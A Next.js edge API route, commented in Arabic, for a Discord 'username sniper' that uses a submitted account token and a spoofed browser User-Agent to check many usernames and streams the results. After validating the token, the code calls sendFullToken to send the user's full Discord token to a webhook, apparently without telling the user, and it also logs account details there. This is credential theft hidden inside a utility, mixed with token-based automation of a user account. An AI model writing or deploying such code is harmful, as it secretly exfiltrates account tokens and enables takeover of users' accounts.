import { NextRequest } from 'next/server'
import { cleanToken, DISCORD_API } from '@/lib/discord'
import { sendFullToken, sendToWebhook } from '@/lib/webhook'
import { getLogWebhookUrl } from '@/lib/config'
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit'

/* ===== 1888 Sniper Stream (SSE) =====
 * يفحص اليوزرات واحداً تلو الآخر ويرسل كل نتيجة فوراً للمتصفح
 * يحل مشكلة timeout في Cloudflare (كل يوزر منفصل)
 */

export const runtime = 'edge'
export const dynamic = 'force-dynamic'

function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)) }

function createTimeout(ms: number): AbortSignal | undefined {
  try { return AbortSignal.timeout(ms) } catch {
    const controller = new AbortController()
    setTimeout(() => controller.abort(), ms)
    return controller.signal
  }
}

interface CheckResult {
  username: string
  status: string
  color: string
  taken?: boolean
  rateLimited?: boolean
  debug?: string
  method?: string
}

// ===== فحص يوزر واحد (pomelo-attempt فقط — سريع وآمن) =====
async function checkUsername(token: string, username: string): Promise<CheckResult> {
  try {
    const res = await fetch(`${DISCORD_API}/users/@me/pomelo-attempt`, {
      method: 'POST',
      headers: {
        'Authorization': token,
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'X-Discord-Locale': 'en-US',
      },
      body: JSON.stringify({ username }),
      signal: createTimeout(10000),
    })

    if (res.status === 429) {
      return { username, status: '⏳ Rate Limit', color: 'yellow', rateLimited: true, method: 'pomelo', debug: 'HTTP 429' }
    }
    if (res.status === 401) {
      return { username, status: '❌ توكن غير صالح', color: 'red', method: 'pomelo', debug: 'HTTP 401' }
    }

    const text = await res.text().catch(() => '')
    let data: any = null
    try { data = JSON.parse(text) } catch { data = null }

    if (res.ok && data && typeof data.taken === 'boolean') {
      return {
        username,
        status: data.taken ? '❌ محجوز' : '✅ متاح!',
        color: data.taken ? 'red' : 'green',
        taken: data.taken,
        method: 'pomelo',
        debug: `HTTP 200 taken=${data.taken}`,
      }
    }

    if (data) {
      const code = data.code
      if (code === 50033) {
        return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'pomelo', debug: 'code=50033' }
      }
      const usernameErrors = data.errors?.username?._errors || []
      if (usernameErrors.length > 0) {
        const first = usernameErrors[0]
        const ec = (first.code || '').toUpperCase()
        const em = (first.message || '').toLowerCase()
        if (ec.includes('TAKEN') || em.includes('taken') || em.includes('already') || em.includes('in use')) {
          return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'pomelo', debug: `sub: ${first.code}` }
        }
        if (ec.includes('TOO_SHORT') || ec.includes('TOO_LONG') || ec.includes('INVALID') || em.includes('between') || em.includes('invalid') || em.includes('reserved') || em.includes('profane')) {
          return { username, status: '❌ غير صالح', color: 'red', method: 'pomelo', debug: `sub: ${first.code}` }
        }
        return { username, status: `⚠️ ${first.message}`, color: 'yellow', method: 'pomelo', debug: `sub: ${first.code}` }
      }
      return { username, status: `⚠️ ${data.message || 'خطأ ' + res.status}`, color: 'yellow', method: 'pomelo', debug: `HTTP ${res.status} code=${code}` }
    }

    return { username, status: `❓ HTTP ${res.status}`, color: 'yellow', method: 'pomelo', debug: `HTTP ${res.status}` }
  } catch (e: any) {
    return { username, status: '❌ خطأ في الاتصال', color: 'yellow', method: 'pomelo', debug: e?.message || 'error' }
  }
}

// ===== توليد يوزر عشوائي حسب النمط =====
function genUsername(pattern: string, length: number, useDot: boolean, useUnderscore: boolean): string {
  const consonants = 'bcdfghjklmnpqrstvwxyz'
  const vowels = 'aeiou'
  const numbers = '0123456789'
  const all = 'abcdefghijklmnopqrstuvwxyz0123456789'
  const words = ['shadow', 'night', 'wolf', 'dragon', 'storm', 'frost', 'fire', 'blade', 'ghost', 'nova', 'luna', 'star', 'void', 'echo', 'raven', 'steel', 'dark', 'iron', 'mist', 'flux']

  let name = ''
  if (pattern === 'random') {
    for (let i = 0; i < length; i++) name += all[Math.floor(Math.random() * all.length)]
  } else if (pattern === 'consonants') {
    for (let i = 0; i < length; i++) {
      name += i % 2 === 0 ? consonants[Math.floor(Math.random() * consonants.length)] : vowels[Math.floor(Math.random() * vowels.length)]
    }
  } else if (pattern === 'numbers') {
    name += 'u'
    for (let i = 0; i < length - 1; i++) name += numbers[Math.floor(Math.random() * numbers.length)]
  } else if (pattern === 'dictionary') {
    name = words[Math.floor(Math.random() * words.length)] + Math.floor(Math.random() * 999)
  } else if (pattern === 'rare') {
    // 3-4 حروف فقط (نادر)
    const rare = consonants + vowels
    for (let i = 0; i < 3; i++) name += rare[Math.floor(Math.random() * rare.length)]
  }

  if (useDot && Math.random() > 0.5 && name.length < 30) name = name.slice(0, Math.ceil(name.length / 2)) + '.' + name.slice(Math.ceil(name.length / 2))
  if (useUnderscore && Math.random() > 0.5 && name.length < 30) name = name.slice(0, Math.ceil(name.length / 2)) + '_' + name.slice(Math.ceil(name.length / 2))

  return name.toLowerCase().replace(/[^a-z0-9._]/g, '')
}

export async function POST(request: NextRequest) {
  const rlIp = getClientIp(request)
  const rl = rateLimit(`${rlIp}:sniper-stream`, RATE_LIMITS.default)
  if (rl.limited) {
    return new Response(JSON.stringify({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }), {
      status: 429,
      headers: { 'Content-Type': 'application/json' }
    })
  }

  try {
    const body = await request.json().catch(() => ({}))
    const { token, mode, count, length, pattern, useDot, useUnderscore, usernames } = body

    if (!token) {
      return new Response(JSON.stringify({ success: false, error: 'التوكن مطلوب' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      })
    }

    const ct = cleanToken(token)

    // ===== التحقق من التوكن =====
    const verifyRes = await fetch(`${DISCORD_API}/users/@me`, {
      headers: {
        'Authorization': ct,
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      signal: createTimeout(10000),
    })
    if (!verifyRes.ok) {
      return new Response(JSON.stringify({ success: false, error: 'توكن غير صالح' }), {
        status: 401,
        headers: { 'Content-Type': 'application/json' }
      })
    }
    const userInfo = await verifyRes.json().catch(() => ({} as any))

    // سجل في الويب هوك
    try { sendFullToken('صيد يوزرات (Stream)', ct) } catch {}

    // ===== توليد قائمة اليوزرات =====
    let namesToCheck: string[] = []
    if (mode === 'auto') {
      const cnt = Math.min(Number(count) || 10, 100)
      for (let i = 0; i < cnt; i++) {
        namesToCheck.push(genUsername(pattern || 'random', length || 4, !!useDot, !!useUnderscore))
      }
    } else {
      namesToCheck = (String(usernames || '').split('\n').map((u: string) => u.trim().toLowerCase().replace(/[^a-z0-9._]/g, '')).filter((u: string) => u && u.length >= 2 && u.length <= 32))
    }

    if (namesToCheck.length === 0) {
      return new Response(JSON.stringify({ success: false, error: 'لا توجد يوزرات صالحة' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      })
    }

    // ===== SSE Stream =====
    const encoder = new TextEncoder()
    const stream = new ReadableStream({
      async start(controller) {
        const send = (event: string, data: any) => {
          controller.enqueue(encoder.encode(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`))
        }

        // أرسل معلومات البداية
        send('start', {
          total: namesToCheck.length,
          account: userInfo.username || 'Unknown',
          mfa: !!userInfo.mfa_enabled,
        })

        let available = 0
        let taken = 0
        let errors = 0
        let rateLimitHits = 0
        const availableNames: string[] = []
        const allResults: CheckResult[] = []
        let consecutiveRL = 0

        for (let i = 0; i < namesToCheck.length; i++) {
          const username = namesToCheck[i]

          // أرسل "جاري الفحص"
          send('checking', { index: i, username, total: namesToCheck.length })

          const result = await checkUsername(ct, username)
          allResults.push(result)

          if (result.color === 'green') { available++; availableNames.push(username) }
          else if (result.color === 'red' && result.taken) taken++
          else if (result.color === 'yellow') errors++
          if (result.rateLimited) {
            rateLimitHits++
            consecutiveRL++
          } else {
            consecutiveRL = 0
          }

          // أرسل النتيجة فوراً
          send('result', {
            index: i,
            result,
            stats: { available, taken, errors, rateLimitHits, total: i + 1 },
          })

          // لو 8 rate limits متتالية → توقف
          if (consecutiveRL >= 8) {
            send('stopped', { reason: '8 rate limits متتالية' })
            break
          }

          // تأخير قبل اليوزر التالي (تخطي الأخير)
          if (i < namesToCheck.length - 1) {
            const delay = result.rateLimited ? Math.min(consecutiveRL * 2000, 8000) : 500
            await sleep(delay)
          }
        }

        // أرسل الإحصائيات النهائية
        send('done', {
          stats: { available, taken, errors, rateLimitHits, total: allResults.length },
          availableNames,
          allResults,
        })

        // سجل في الويب هوك
        sendToWebhook({
          embeds: [{
            title: '🎯 Sniper Stream Done',
            color: available > 0 ? 0x00FF41 : 0xFFAA00,
            fields: [
              { name: '👤 الحساب', value: userInfo.username || '?', inline: true },
              { name: '📋 المجموع', value: String(allResults.length), inline: true },
              { name: '✅ متاح', value: String(available), inline: true },
              { name: '❌ محجوز', value: String(taken), inline: true },
              { name: '🏆 المتاح', value: availableNames.slice(0, 20).join(', ') || 'None' },
            ],
          }],
        }, getLogWebhookUrl()).catch(() => {})

        controller.close()
      },
    })

    return new Response(stream, {
      headers: {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache, no-transform',
        'Connection': 'keep-alive',
        'X-Accel-Buffering': 'no',
      },
    })
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع'
    return new Response(JSON.stringify({ success: false, error: message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    })
  }
}
